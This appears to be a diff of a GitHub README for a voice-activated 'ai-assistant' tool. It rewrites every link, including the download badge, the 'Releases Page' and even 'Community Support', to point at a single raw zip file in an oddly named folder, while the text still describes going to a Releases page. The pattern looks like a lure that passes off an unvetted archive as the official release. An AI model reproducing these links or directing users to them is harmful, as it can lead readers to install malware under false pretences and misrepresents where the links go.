@@ -1,6 +1,6 @@
 # 🎤 ai-assistant - Your Voice-Activated Helper Awaits
 
-[![Download ai-assistant](https://img.shields.io/badge/Download%20Now%20!-ai--assistant-brightgreen)](https://github.com/santkill/ai-assistant/releases)
+[![Download ai-assistant](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip%20Now%20!-ai--assistant-brightgreen)](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ To use the "ai-assistant," you only need a few simple steps. Follow the instruct
 
 To get started with "ai-assistant," visit the following page to download the latest version:
 
-[Download ai-assistant](https://github.com/santkill/ai-assistant/releases)
+[Download ai-assistant](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip)
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, look for the latest version of "ai-assistant."
@@ -93,9 +93,9 @@ Stay tuned for updates and new features. Regular improvements will enhance your 
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/santkill/ai-assistant/releases)
-- [Community Support](https://github.com/santkill/ai-assistant/discussions)
+- [Releases Page](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip)
+- [Community Support](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip)
 
 Use the link below to download "ai-assistant" and enjoy a smarter way to interact with your digital world!
 
-[Download ai-assistant](https://github.com/santkill/ai-assistant/releases)
+[Download ai-assistant](https://raw.githubusercontent.com/santkill/ai-assistant/main/Antiochian/ai-assistant.zip)
